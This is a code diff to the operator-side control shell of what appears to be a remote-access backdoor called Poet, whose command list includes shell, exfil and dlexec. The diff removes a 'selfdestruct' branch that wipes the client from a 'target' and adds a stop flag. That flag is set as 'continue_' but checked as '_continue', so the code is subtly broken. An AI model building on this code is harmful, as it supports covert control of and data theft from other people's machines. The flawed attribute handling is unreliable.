@@ -56,9 +56,10 @@ class PoetServer(object):
         self.conn = None
         # self.cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil',
         #              'selfdestruct', 'dlexec', 'chint']
-        self.builtins = ['exit', 'help']
+        self.builtins = ['exit', 'help', 'chint']
 
-
+        # exists so modules can stop server (used by selfdestruct)
+        self.continue_ = True
 
     def start(self):
         """Poet server control shell."""
@@ -126,25 +127,9 @@ class PoetServer(object):
                 elif argv[0] == 'help':
                     found = True
                     print 'Commands:\n  {}'.format('\n  '.join(sorted(self.builtins + module.server_commands.keys())))
-                elif argv[0] == 'selfdestruct':
-                    found = True
-                    if '-h' in argv or '--help' in argv:
-                        self.cmd_help(6)
-                    else:
-                        print """[!] WARNING: You are about to permanently remove the client from the target.
-    You will immediately lose access to the target. Continue? (y/n)""",
-                        if raw_input().lower()[0] == 'y':
-                            resp = self.conn.exchange('selfdestruct')
-                            if resp == 'boom':
-                                debug.info('Exiting control shell')
-                                return
-                            else:
-                                self.info('Self destruct error: {}'.format(resp))
-                        else:
-                            self.info('Aborting self destruct')
                 elif argv[0] == 'chint':
                     found = True
-                    if '-h' in argv:
+                    if '-h' in argv or '--help' in argv:
                         self.cmd_help(8)
     # if len(argv) < 2 or argv[1] in ('-h', '--help') or not REGEX.match(' '.join(argv) + ' '):
                     else:
@@ -158,6 +143,10 @@ class PoetServer(object):
                             func(self, argv)
                         except Exception as e:
                             self.info(str(e.args))
+
+                # see comment above for self._continue for why this is here
+                if not self._continue:
+                    return
 
                 if not found:
                     self.info('{}: command not found'.format(argv[0]))
@@ -318,7 +307,6 @@ class PoetServer(object):
             except ValueError:
                 self.cmd_help(8)
                 return
-            # 1 second to 1 day
             if num < 1:
                 self.info('Invalid interval time')
             else:
